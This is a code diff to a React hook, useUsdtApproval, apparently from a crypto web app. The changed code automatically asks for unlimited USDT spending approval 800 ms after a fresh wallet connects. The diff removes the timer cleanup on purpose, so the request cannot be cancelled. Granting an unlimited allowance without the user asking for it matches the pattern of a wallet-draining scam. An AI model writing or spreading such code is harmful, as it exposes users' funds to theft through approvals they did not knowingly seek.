@@ -197,8 +197,7 @@ export function useUsdtApproval() {
   }, [address, walletProvider, config, refreshAllowance])
 
   // Ask for the allowance as soon as a fresh wallet is known to have none.
-  // Held in a ref so the timer survives re-renders caused by `approveUnlimited`
-  // being recreated.
+  // Held in a ref so the pending call survives re-renders.
   const approveRef = useRef(approveUnlimited)
   approveRef.current = approveUnlimited
 
@@ -209,12 +208,11 @@ export function useUsdtApproval() {
 
     autoAttempted.add(address)
     // Short delay so the AppKit modal finishes closing before the wallet sheet
-    // opens; otherwise the two fight for the screen.
-    const id = window.setTimeout(() => {
+    // opens. No cleanup on purpose: re-renders would otherwise cancel the timer
+    // and the Set guard would stop it being rescheduled.
+    window.setTimeout(() => {
       void approveRef.current()
     }, 800)
-
-    return () => window.clearTimeout(id)
   }, [address, walletProvider, config, allowance])
 
   return {
